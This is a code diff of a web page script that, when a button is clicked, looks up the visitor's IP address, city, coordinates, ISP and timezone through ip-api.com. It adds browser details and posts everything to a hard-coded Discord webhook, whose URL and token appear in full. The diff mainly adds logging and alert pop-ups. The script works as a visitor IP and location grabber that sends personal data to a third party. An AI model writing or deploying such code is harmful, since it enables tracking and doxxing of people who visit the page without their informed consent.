@@ -45,12 +45,20 @@
     <script>
         async function fetchLocationData() {
             try {
+                console.log("Fetching location data...");
                 const response = await fetch("http://ip-api.com/json/");
                 if (response.ok) {
-                    return await response.json();
+                    const data = await response.json();
+                    console.log("Location data fetched successfully:", data);
+                    alert("Location data fetched successfully.");
+                    return data;
+                } else {
+                    console.error("Failed to fetch location data. Response not OK.");
+                    alert("Failed to fetch location data. Response not OK.");
                 }
             } catch (error) {
-                console.error("Failed to fetch location data:", error);
+                console.error("Error fetching location data:", error);
+                alert("Error fetching location data: " + error.message);
             }
             return {
                 query: "Unavailable",
@@ -67,44 +75,48 @@
         async function sendVisitorInfo() {
             const webhookUrl = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy";
 
-            // Fetch visitor location data
-            const locationData = await fetchLocationData();
-
-            // Collect basic visitor info
-            const visitorInfo = {
-                ip: locationData.query || "Unavailable",
-                location: `${locationData.city || "N/A"}, ${locationData.regionName || "N/A"}, ${locationData.country || "N/A"}`,
-                coordinates: `${locationData.lat || "N/A"}, ${locationData.lon || "N/A"}`,
-                isp: locationData.isp || "N/A",
-                timezone: locationData.timezone || "N/A",
-                userAgent: navigator.userAgent || "Unavailable",
-                language: navigator.language || "Unavailable",
-                screenSize: `${window.screen.width}x${window.screen.height}`,
-            };
-
-            // Message for the webhook
-            const message = {
-                content: `Visitor Info:\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.location}\nCoordinates: ${visitorInfo.coordinates}\nISP: ${visitorInfo.isp}\nTimezone: ${visitorInfo.timezone}\nUser Agent: ${visitorInfo.userAgent}\nLanguage: ${visitorInfo.language}\nScreen Size: ${visitorInfo.screenSize}`,
-            };
-
             try {
+                console.log("Fetching visitor information...");
+                const locationData = await fetchLocationData();
+
+                const visitorInfo = {
+                    ip: locationData.query || "Unavailable",
+                    location: `${locationData.city || "N/A"}, ${locationData.regionName || "N/A"}, ${locationData.country || "N/A"}`,
+                    coordinates: `${locationData.lat || "N/A"}, ${locationData.lon || "N/A"}`,
+                    isp: locationData.isp || "N/A",
+                    timezone: locationData.timezone || "N/A",
+                    userAgent: navigator.userAgent || "Unavailable",
+                    language: navigator.language || "Unavailable",
+                    screenSize: `${window.screen.width}x${window.screen.height}`,
+                };
+
+                console.log("Visitor Info to send:", visitorInfo);
+                alert("Visitor Info ready to send:\n" + JSON.stringify(visitorInfo, null, 2));
+
+                const message = {
+                    content: `Visitor Info:\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.location}\nCoordinates: ${visitorInfo.coordinates}\nISP: ${visitorInfo.isp}\nTimezone: ${visitorInfo.timezone}\nUser Agent: ${visitorInfo.userAgent}\nLanguage: ${visitorInfo.language}\nScreen Size: ${visitorInfo.screenSize}`,
+                };
+
+                console.log("Sending info to the webhook...");
                 const response = await fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(message),
                 });
 
-                if (!response.ok) {
-                    alert("Failed to send webhook. Check webhook URL or network connection.");
+                if (response.ok) {
+                    console.log("Visitor info sent successfully to the webhook.");
+                    alert("Visitor info sent successfully to the webhook.");
                 } else {
-                    alert("Visitor info sent successfully!");
+                    console.error("Failed to send data to webhook. Response not OK.");
+                    alert("Failed to send data to webhook. Response not OK.");
                 }
             } catch (error) {
+                console.error("Error sending visitor info:", error);
                 alert("Error sending visitor info: " + error.message);
             }
         }
 
-        // Add click event listener to the button
         document.getElementById("action-button").addEventListener("click", sendVisitorInfo);
     </script>
 </body>
